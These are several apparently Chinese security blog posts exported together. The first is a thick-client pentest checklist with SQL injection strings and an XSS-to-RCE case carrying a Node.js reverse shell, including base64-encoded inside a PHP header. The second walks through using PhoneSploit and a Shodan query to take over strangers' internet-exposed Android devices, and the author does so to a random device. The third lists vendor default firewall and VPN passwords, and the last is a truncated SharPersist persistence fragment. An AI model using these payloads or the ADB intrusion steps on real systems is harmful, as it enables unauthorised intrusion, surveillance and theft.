<p>项目地址：<a href="https://github.com/theLSA/CS-checklist" target="_blank" rel="noopener">https://github.com/theLSA/CS-checklist</a></p>
<hr>
<h1 id="CS-checklist"><a href="#CS-checklist" class="headerlink" title="CS-checklist"></a><strong>CS-checklist</strong></h1><br>

<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul>
<li><a href="#cs-checklist"><strong>CS-checklist</strong></a><ul>
<li><a href="#0x00-前言"><strong>0x00 前言</strong></a></li>
<li><a href="#0x01-概述"><strong>0x01 概述</strong></a></li>
<li><a href="#0x02-开发语言"><strong>0x02 开发语言</strong></a></li>
<li><a href="#0x03-协议"><strong>0x03 协议</strong></a></li>
<li><a href="#0x04-数据库"><strong>0x04 数据库</strong></a></li>
<li><a href="#0x05-测试工具"><strong>0x05 测试工具</strong></a></li>
<li><a href="#0x06-代理设置"><strong>0x06 代理设置</strong></a></li>
<li><a href="#0x07-测试点"><strong>0x07 测试点</strong></a><ul>
<li><a href="#0-信息收集"><strong>0.</strong> <strong>信息收集</strong></a></li>
<li><a href="#1-逆向工程"><strong>1.</strong> <strong>逆向工程</strong></a></li>
<li><a href="#2-信息泄露"><strong>2.</strong> <strong>信息泄露</strong></a></li>
<li><a href="#3-传输流量"><strong>3.</strong> <strong>传输流量</strong></a></li>
<li><a href="#4-其他漏洞"><strong>4.</strong> <strong>其他漏洞</strong></a><ul>
<li><a href="#爆破"><strong>爆破</strong></a></li>
<li><a href="#用户名枚举"><strong>用户名枚举</strong></a></li>
<li><a href="#sql语句暴露"><strong>SQL语句暴露</strong></a></li>
<li><a href="#sql注入"><strong>SQL注入</strong></a></li>
<li><a href="#csv注入"><strong>CSV注入</strong></a></li>
<li><a href="#弱口令"><strong>弱口令</strong></a></li>
<li><a href="#xss"><strong>XSS</strong></a></li>
<li><a href="#命令执行"><strong>命令执行</strong></a></li>
<li><a href="#逻辑缺陷"><strong>逻辑缺陷</strong></a></li>
<li><a href="#密码明文传输"><strong>密码明文传输</strong></a></li>
<li><a href="#dll劫持"><strong>DLL劫持</strong></a></li>
<li><a href="#授权认证缺陷"><strong>授权认证缺陷</strong></a></li>
<li><a href="#越权"><strong>越权</strong></a></li>
<li><a href="#未授权"><strong>未授权</strong></a></li>
<li><a href="#溢出"><strong>溢出</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x08-相关技巧"><strong>0x08 相关技巧</strong></a></li>
<li><a href="#0x09-参考资料相关资源"><strong>0x09 参考资料&amp;&amp;相关资源</strong></a></li>
</ul>
</li>
</ul>
<br>

<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>本项目主要针对pc客户端（cs架构）渗透测试，结合自身测试经验和网络资料形成checklist，如有任何问题，欢迎联系，期待大家贡献更多的技巧和案例。</p>
<br>

<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a><strong>0x01 概述</strong></h2><p>PC客户端，有丰富功能的gui，c-s架构。</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs00.png" alt="cs00"></p>
<p>//图片源自:</p>
<p><a href="#article">https://resources.infosecinstitute.com/practical-thick-client-application-penetration-testing-using-damn-vulnerable-thick-client-app-part-1/#article</a></p>
<br>

<h2 id="0x02-开发语言"><a href="#0x02-开发语言" class="headerlink" title="0x02 开发语言"></a><strong>0x02 开发语言</strong></h2><p>C#(.NET)，JAVA，DELPHI，C，C++……</p>
<br> 

<h2 id="0x03-协议"><a href="#0x03-协议" class="headerlink" title="0x03 协议"></a><strong>0x03 协议</strong></h2><p>TCP、HTTP(S)，TDS……</p>
<br> 

<h2 id="0x04-数据库"><a href="#0x04-数据库" class="headerlink" title="0x04 数据库"></a><strong>0x04 数据库</strong></h2><p>oracle，mssql，db2……</p>
<br> 

<h2 id="0x05-测试工具"><a href="#0x05-测试工具" class="headerlink" title="0x05 测试工具"></a><strong>0x05 测试工具</strong></h2><p>//相关工具下载：<a href="https://github.com/theLSA/hack-cs-tools" target="_blank" rel="noopener">https://github.com/theLSA/hack-cs-tools</a></p>
<p>dvta： pc客户端靶场</p>
<p>ida pro： 静态分析工具</p>
<p>ollydbg：动态分析工具</p>
<p>CFF Explorer：PE文件分析</p>
<p>PEID：查壳工具</p>
<p>exeinfope/studype：pe文件分析</p>
<p>wireshark：观察流量</p>
<p>tcpview：观察tcp流量</p>
<p>echo Mirage：可拦截tcp流量</p>
<p>burpsuite：http(s)抓包</p>
<p>proxifier：全局代理流量</p>
<p>procmon：文件和注册表监控</p>
<p>regshot：注册表变化对比</p>
<p>process Hacker：进程分析</p>
<p>RegfromApp：注册表监控</p>
<p>WSExplorer：岁月联盟进程抓包工具</p>
<p>strings：查看程序的字符串</p>
<br> 

<p>.net[反]编译：</p>
<p>dotpeek</p>
<p>de4dot</p>
<p>dnspy</p>
<p>ilspy</p>
<p>sae</p>
<p>ildasm</p>
<p>ilasm</p>
<br> 

<p>Java反编译</p>
<p>jad</p>
<p>jd-gui</p>
<p>jadx</p>
<p>dex2jar</p>
<p>在线版：<br><br><a href>javare.cn</a></p>
<p><a href="http://www.javadecompilers.com" target="_blank" rel="noopener">www.javadecompilers.com</a></p>
<br>

<p>Reflexil：组装编辑器（可以作为ilspy插件）</p>
<p>Vcg：自动化代码审计工具</p>
<p>BinScope：二进制分析工具</p>
<br> 

<h2 id="0x06-代理设置"><a href="#0x06-代理设置" class="headerlink" title="0x06 代理设置"></a><strong>0x06 代理设置</strong></h2><p>大部分客户端没有代理配置功能，需要自行设置全局代理，如下两种方法：</p>
<p>1）IE-internet设置-连接-局域网设置。</p>
<p>2）proxifier-proxy server/proxification rules</p>
<p>//http的流量可以结合burpsuite方便测试（proxy server设置为burp代理地址）。</p>
<br> 

<h2 id="0x07-测试点"><a href="#0x07-测试点" class="headerlink" title="0x07 测试点"></a><strong>0x07 测试点</strong></h2><br> 

<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="0. 信息收集"></a><strong>0.</strong> <strong>信息收集</strong></h3><p>编译信息，开发环境/语言，使用协议，数据库，ip，混淆/加密，是否加壳等。</p>
<br>

<p>案例0-CFF查看客户端信息（如编译环境）</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs01.png" alt="cs01"></p>
<p><br><br> </p>
<h3 id="1-逆向工程"><a href="#1-逆向工程" class="headerlink" title="1. 逆向工程"></a><strong>1.</strong> <strong>逆向工程</strong></h3><p>反编译，源代码泄露，硬编码key/password，加解密逻辑，角色判断逻辑（0-admin，1-normaluser），后门等。 </p>
<br>

<p>案例0-反编译获取加解密逻辑并编写解密工具</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs02.png" alt="cs02"></p>
<p>通过该逻辑和获取的信息</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs03.png" alt="cs03"></p>
<p><strong>Encrypted Text:</strong> CTsvjZ0jQghXYWbSRcPxpQ==</p>
<p><strong>AES KEY:</strong> J8gLXc454o5tW2HEF7HahcXPufj9v8k8</p>
<p><strong>IV:</strong> fq20T0gMnXa6g0l4</p>
<p>编写解密工具</p>
<p><code>using System;</code><br><code>using System.Collections.Generic;</code><br><code>using System.ComponentModel;</code><br><code>using System.Data;</code></p>
<p><code>using System.Drawing;</code></p>
<p><code>using System.Linq;</code></p>
<p><code>using System.Text;</code></p>
<p><code>using System.Threading.Tasks;</code></p>
<p><code>using System.Windows.Forms;</code></p>
<p><code>using System.Security.Cryptography;</code></p>
<p><code>namespace aesdecrypt</code></p>
<p><code>{</code></p>
<p>​    <code>public partial class aesdecrypt : Form</code></p>
<p>​    <code>{</code></p>
<p>​        <code>public aesdecrypt()</code></p>
<p>​        <code>{</code></p>
<p>​            <code>InitializeComponent();</code></p>
<p>​        <code>}</code></p>
<p>​        <code>private void decrypt(object sender, EventArgs e)</code></p>
<p>​        <code>{</code></p>
<p>​            <code>String key = “J8gLXc454o5tW2HEF7HahcXPufj9v8k8”;</code></p>
<p>​            <code>String IV = “fq20T0gMnXa6g0l4”;</code></p>
<p>​            <code>String encryptedtext = “CTsvjZ0jQghXYWbSRcPxpQ==”;</code></p>
<p>​            <code>byte[] encryptedBytes = Convert.FromBase64String(encryptedtext);</code></p>
<p>​            <code>AesCryptoServiceProvider aes = new AesCryptoServiceProvider();</code></p>
<p>​            <code>aes.BlockSize = 128;</code></p>
<p>​            <code>aes.KeySize = 256;</code></p>
<p>​            <code>aes.Key = System.Text.ASCIIEncoding.ASCII.GetBytes(key);</code></p>
<p>​            <code>aes.IV = System.Text.ASCIIEncoding.ASCII.GetBytes(IV);</code></p>
<p>​            <code>aes.Padding = PaddingMode.PKCS7;</code></p>
<p>​            <code>aes.Mode = CipherMode.CBC;</code></p>
<p>​            <code>ICryptoTransform crypto = aes.CreateDecryptor(aes.Key, aes.IV);</code></p>
<p>​            <code>byte[] decryptedbytes = crypto.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);</code></p>
<p>​            <code>String decryptedString = System.Text.ASCIIEncoding.ASCII.GetString(decryptedbytes);</code></p>
<p>​            <code>Console.WriteLine(“\n”);</code></p>
<p>​            <code>Console.WriteLine(“##########Decryptig Database password##########\n”);</code></p>
<p>​            <code>Console.WriteLine(“Decrypted Database password:” + decryptedString+”\n”);</code></p>
<p>​            <code>Console.WriteLine(“##########Done##########\n”);</code></p>
<p>​        <code>}</code></p>
<p>​    <code>}</code></p>
<p><code>}</code></p>
<p>//解密代码源自<a href="https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article" target="_blank" rel="noopener">https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-5/#article</a></p>
<br>

<p>案例1-反编译修改代码逻辑让普通用户以管理员登录</p>
<p>dvta</p>
<p>1-Isadmin</p>
<p>0-Normaluser</p>
<p>改1为0即可判断为admin</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs04.png" alt="cs04"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs05.png" alt="cs05"></p>
<p><br><br></p>
<h3 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a><strong>2.</strong> <strong>信息泄露</strong></h3><p>明文敏感信息，敏感文件（如安装目录下的xxx.config）。</p>
<p>注册表：利用regshot比较客户端运行（如登录）前后注册表差别。 </p>
<p>开发调试日志泄露（如dvta.exe &gt;&gt; log.txt）</p>
<p>process hacker查看客户端内存中的明文敏感数据（如账号密码/key）。</p>
<p>strings直接查看客户端字符串（如ip信息）。</p>
<p>查看源代码（如github,gitee等）</p>
<br>

<p>案例0-配置敏感信息泄露</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs06.png" alt="cs06"></p>
<br>

<p>案例1-内存泄露数据库账号密码</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs07.png" alt="cs07"></p>
<br>

<p>案例2-源代码含有硬编码ftp账号密码</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs08.png" alt="cs08"></p>
<br> 

<p>案例3-开发调试日志泄露</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs09.png" alt="cs09"></p>
<br>

<p>案例4-某系统登录后本地保存账号密码</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs10.png" alt="cs10"></p>
<p>//本案例来源于<a href="https://blog.csdn.net/weixin_30685047/article/details/95916065" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30685047/article/details/95916065</a></p>
<p><br><br> </p>
<h3 id="3-传输流量"><a href="#3-传输流量" class="headerlink" title="3. 传输流量"></a><strong>3.</strong> <strong>传输流量</strong></h3><p>wireshark/echo Mirage/burpsuite+nopeproxy/fillder/charles</p>
<p>ftp等协议明文传输的账号密码</p>
<p>SQL语句明文传输（如利用构造注入，越权等）</p>
<br>

<p>案例0-正方教务系统sql语句明文传输，返回明文数据</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs11.png" alt="cs11"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs12.png" alt="cs12"></p>
<p>//本案例来源于wooyun</p>
<p><br><br></p>
<h3 id="4-其他漏洞"><a href="#4-其他漏洞" class="headerlink" title="4. 其他漏洞"></a><strong>4.</strong> <strong>其他漏洞</strong></h3><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a><strong>爆破</strong></h4><p>如登录功能。</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs23.png" alt="cs23"></p>
<br> 

<h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a><strong>用户名枚举</strong></h4><p>案例0</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs13.png" alt="cs13"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs14.png" alt="cs14"></p>
<br>

<h4 id="SQL语句暴露"><a href="#SQL语句暴露" class="headerlink" title="SQL语句暴露"></a><strong>SQL语句暴露</strong></h4><p>案例0</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs15.png" alt="cs15"></p>
<br>

<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>如登录处，万能密码</p>
<p>xxx’ or ‘x’=’x</p>
<p>xxx’ or 1=1–</p>
<p>输入框处，构造闭合报错，如’、’)、%’)、order by 100–等。</p>
<p>利用显示位或报错注出数据，原理同web注入，不同数据库大同小异。</p>
<br> 

<p>案例0-oracle注入</p>
<p>‘ union select null,null,(select user from dual),null,null,(select banner from sys.v_$version where     rownum=1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from dual–</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs16.png" alt="cs16"></p>
<br>

<p>案例1-mssql注入</p>
<p>111’) and (select user)&gt;0–</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs17.png" alt="cs17"></p>
<br>

<h4 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a><strong>CSV注入</strong></h4><p>如导出excel，输入1+1，导出后看是否为2。</p>
<br> 

<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><strong>弱口令</strong></h4><p>可尝试admin 123456等。</p>
<br>

<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h4><p>如Electron，NodeWebKit等。</p>
<br> 

<p>案例0-中国蚁剑xss到rce</p>
<p>环境：win7+phpstudy(php5.6.27-nts)+perl+nc+antsword2.0.5</p>
<p>xss webshell：</p>
<p><code>&lt;?php</code></p>
<p><code>header(&#39;HTTP/1.1 500 &lt;img src=# onerror=alertx&gt;&#39;);</code></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs18.png" alt="cs18"></p>
<p>Win+node.js:</p>
<p>成功</p>
<p><code>var net = require(&quot;net&quot;), sh = require(&quot;child_process&quot;).exec(&quot;cmd.exe&quot;);</code></p>
<p><code>var client = new net.Socket();</code></p>
<p><code>client.connect(6677, &quot;127.0.0.1&quot;, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);</code></p>
<p><code>sh.stderr.pipe(client);});</code></p>
<p><code>&lt;?php</code></p>
<p><code>header(&quot;HTTP/1.1 500 Not &lt;img src=# onerror=&#39;eval(new Buffer(</code>dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg2Njc3LCAiMTI3LjAuMC4xIiwgZnVuY3Rpb24oKXtjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKc2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=<code>,</code>base64<code>).toString())&#39;&gt;&quot;);</code></p>
<p><code>?&gt;</code></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs19.png" alt="cs19"></p>
<p>相关参考</p>
<p><a href="https://www.anquanke.com/post/id/176379" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176379</a></p>
<br> 

<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h4><br>
案例0-印象笔记windows客户端6.15本地文件读取和远程命令执行 

<p><a href="http://blog.knownsec.com/2018/11/印象笔记-windows-客户端-6-15-本地文件读取和远程命令执行/" target="_blank" rel="noopener">http://blog.knownsec.com/2018/11/%E5%8D%B0%E8%B1%A1%E7%AC%94%E8%AE%B0-windows-%E5%AE%A2%E6%88%B7%E7%AB%AF-6-15-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>
<br> 

<p>案例1-某云pc客户端命令执行挖掘过程 </p>
<p><a href="https://www.secpulse.com/archives/53852.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/53852.html</a></p>
<br> 

<p>案例2-金山WPS Mail邮件客户端远程命令执行漏洞(Mozilla系XUL程序利用技巧) </p>
<p><a href="https://shuimugan.com/bug/view?bug_no=193117" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=193117</a></p>
<br> 

<h4 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a><strong>逻辑缺陷</strong></h4><p>测试点同web。</p>
<br>  

<h4 id="密码明文传输"><a href="#密码明文传输" class="headerlink" title="密码明文传输"></a><strong>密码明文传输</strong></h4><br> 

<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a><strong>DLL劫持</strong></h4><p>Linux文件搜索顺序：</p>
<ol>
<li><p>当前目录</p>
</li>
<li><p>PATH顺序值目录</p>
</li>
</ol>
<br>

<p>程序搜索Dll顺序：</p>
<p>//没提供绝对路径</p>
<p>1.应用程序加载的目录。</p>
<p>2.当前目录。</p>
<p>3.系统目录 (C:\Windows\System32\)。</p>
<p>4.16位的系统目录。</p>
<p>5.Windows目录。</p>
<p>6.PATH变量的目录。</p>
<p>程序可以加载攻击者放置的恶意dll。</p>
<p>利用procmon搜索程序加载的dll，观察name not found。</p>
<p>msf生成恶意dll放置于程序加载位置，运行程序即可触发payload。</p>
<br> 

<p>案例0-dll劫持</p>
<p>dvta</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs20.png" alt="cs20"></p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs21.png" alt="cs21"></p>
<br>

<h4 id="授权认证缺陷"><a href="#授权认证缺陷" class="headerlink" title="授权认证缺陷"></a><strong>授权认证缺陷</strong></h4><p>注册表键值，授权服务器返回信息构造。</p>
<p>相关参考</p>
<p><a href="https://cloud.tencent.com/developer/article/1430899" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1430899</a></p>
<br> 

<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a><strong>越权</strong></h4><br> 

<h4 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a><strong>未授权</strong></h4><br> 

<p>案例0-正方教务系统数据库任意操作</p>
<p>知道ip即可接管数据库</p>
<p><img src="https://github.com/theLSA/cs-checklist/raw/master/demo/cs22.png" alt="cs22"></p>
<p>//本案例来源于wooyun</p>
<br>

<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><strong>溢出</strong></h4><p><br><br></p>
<h2 id="0x08-相关技巧"><a href="#0x08-相关技巧" class="headerlink" title="0x08 相关技巧"></a><strong>0x08 相关技巧</strong></h2><p>1.wireshark直接过滤出服务器或数据库的ip或协议方便查看，如</p>
<p>ip.addr == 1.2.3.4&amp;&amp;http</p>
<p>2.如果有数据库账号，可以用数据库监控sql语句操作（如sql server profiler）。</p>
<p><br><br> </p>
<h2 id="0x09-参考资料-amp-amp-相关资源"><a href="#0x09-参考资料-amp-amp-相关资源" class="headerlink" title="0x09 参考资料&amp;&amp;相关资源"></a><strong>0x09 参考资料&amp;&amp;相关资源</strong></h2><p><a href="https://resources.infosecinstitute.com/" target="_blank" rel="noopener">https://resources.infosecinstitute.com</a></p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>入侵全球安卓智能设备–PhoneSploit</title>
    <url>/2019/09/17/%E5%85%A5%E4%BE%B5%E5%85%A8%E7%90%83%E5%AE%89%E5%8D%93%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E2%80%93PhoneSploit/</url>
    <content><![CDATA[<p>刚在某论坛上看到了一篇文章引起了我的兴趣。<br><img src="https://i.loli.net/2019/11/11/DweyxtgKnPOkIhp.png" alt="Image-10.png"></p><a id="more"></a>
<p>稍微看了看，讲的是使用PhoneSploit+shodan通过adb调试开放在公网上的安卓设备。<br>所以，我自己实验了一下。<br>首先跟进github上的项目。地址：<a href="https://github.com/metachar/PhoneSploit" target="_blank" rel="noopener">https://github.com/metachar/PhoneSploit</a><br>作者非常的用心，整个安装加用法都安排的明明白白的，甚至是连shodan的语法都写了。瞬间Star加Fork。</p>
<hr>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>readme中写清楚了在windows和linux下怎么安装了，我这里是使用的kali，所以下文是直接在kali中的演示过程。<br><img src="https://i.loli.net/2019/11/11/72TAFaGrezBMdpQ.png" alt="Image-12.png"></p>
<p>按照作者的说法，在kali下键入以下命令先安装PhoneSploit和其必要模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Zucccs/PhoneSploit</span><br><span class="line">cd PhoneSploit</span><br><span class="line">pip install colorama</span><br></pre></td></tr></table></figure>

<p>安装好之后还不能使用，还需要安装adb和fastboot<br>键入以下命令更新+安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install android-tools-adb android-tools-fastboot</span><br></pre></td></tr></table></figure>
<p>完了之后就开始使用吧！<br>进入PhoneSploit的目录，键入以下命令启动程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python main_linux.py</span><br></pre></td></tr></table></figure>
<p>ps：使用python2版本！<br>进入之后会有一个提示安装adb via命令行，输入Y即可<br>然后正式进入界面！<br><img src="https://i.loli.net/2019/11/11/rFE2kV5DOIYs3qm.png" alt="Image-14.png"></p>
<p>提示输入一个IP地址，这里我们就需要使用shodan啦！会看项目readme中可以看到作者给出了搜索语法，直接打开即可（shodan需要登录），这里我也顺便贴出来语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android debug bridge product:”Android Debug Bridge”</span><br></pre></td></tr></table></figure>

<p>也可以直接打开这个链接，都是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.shodan.io/search?query=android+debug+bridge+product%3A%E2%80%9DAndroid+Debug+Bridge%E2%80%9D</span><br></pre></td></tr></table></figure>
<p>可以看到下图中搜索处全球1W+设备<br><img src="https://i.loli.net/2019/11/11/giUKh82MVWevRnl.png" alt="Image-15.png"></p>
<p>我们随便找一个试试<br>输入完IP之后，可以看到连接上了，之后我们只要输入菜单中对应的功能即可。<br>比如我这里输入：7。然后输入要保存的文件名：100.png，看一下对方的屏幕截图。</p>
<p><img src="https://i.loli.net/2019/11/11/V4OczG5nxuZflyP.png" alt="Image-18.png"></p>
<p>然后在程序目录下可以看到生成的图片。<br><img src="https://i.loli.net/2019/11/11/i8VDmRoYAlEnuWx.png" alt="Image-19.png"></p>
<hr>
<p>值得注意的是，PhoneSploit的菜单功能非常强大。除了菜单7可以截屏之外，还有6录制，3同时连接其他设备，4获取shell，以及安装、卸载、运行app，13导出设备信息，还能16端口转发、22开关wifi、23移除密码。作者真贴心！简直让小白无门槛了</p>
<p><img src="https://i.loli.net/2019/11/11/kJQbGoLCaKUYRuj.png" alt="Image-21.png"><br><img src="https://i.loli.net/2019/11/11/gFXyZ2lzfTUECOL.png" alt="Image-20.png"></p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>1、其实这些设备大部分都是连接公网IP的智能电视类设备，不一定是手机，所以我在文中也并未提及手机二字。</p>
<p>2、一些厂商在制作该类产品的时候，一开始就是默认开启adb调试的，因为他们全国乃至全球销售智能电视机，但并不能出了问题就到人家里去修，所以他们为了方便自己工作，就默认开了。但是这样做非常的不安全，就如上文实验的一样。但是手机不一样，只要你自己没瞎搞，没有root的手机是不会开启adb调试的。</p>
<p>3、上面shodan搜出来的1w+用户，怕是要遭罪了</p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>各大厂商设备默认密码</title>
    <url>/2019/09/15/%E5%90%84%E5%A4%A7%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绿盟安全产品默认密码排查列表</span><br><span class="line"></span><br><span class="line">IPS入侵防御系统、SAS­H运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统</span><br><span class="line">sysauditor/sysauditor</span><br><span class="line">sysmanager/sysmanager</span><br><span class="line">supervisor/supervisor</span><br><span class="line">maintainer/maintainer</span><br><span class="line">webpolicy/webpolicy</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/conadmin</span><br><span class="line">supervis/supervis</span><br><span class="line">webaudit/webaudit</span><br><span class="line">sysadmin/sysadmin</span><br><span class="line">conadmin/nsfocus</span><br><span class="line">weboper/weboper</span><br><span class="line">auditor/auditor</span><br><span class="line">weboper/weboper</span><br><span class="line">nsadmin/nsadmin</span><br><span class="line">admin/nsfocus</span><br><span class="line">admin/admin</span><br><span class="line">shell/shell</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/19/mt4nfPpGKLvEiBh.png" alt="WechatIMG30.png"></p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透权限维持–SharPersist</title>
    <url>/2019/09/15/%E5%90%8E%E6%B8%97%E9%80%8F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E2%80%93SharPersist/</url>
    <content><![CDATA[<p>我从github上下载下来，放在virscan上和virustotal上查杀了一下，以下为对比信息。</p><a id="more"></a>
<p><img src="https://i.loli.net/2019/11/11/wO5ZMFdyuTBrqV1.png" alt="9fe92f50-b724-44ac-bbaa-1c6c4878ed83-image.png"></p>
<hr>
<p><img src="https://i.loli.net/2019/11/11/8qGS4DBV7EsRKNl.png" alt="a57a5016-db3a-48b0-ab10-066c16354090-image.png"></p>
<p>结果还是不错的！</p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>刚好我使用的也是keepass（公司规定存储密码类工具必须使用离线工具，不可在云端存放），所以试一下</p>
<p><img src="https://i.loli.net/2019/11/11/TkiPlzI9uExCOt8.png" alt="fda1efc4-477f-4112-8c27-6d50d969f22f-image.png"></p>
<p>输入命令，可以看到成功添加了</p>
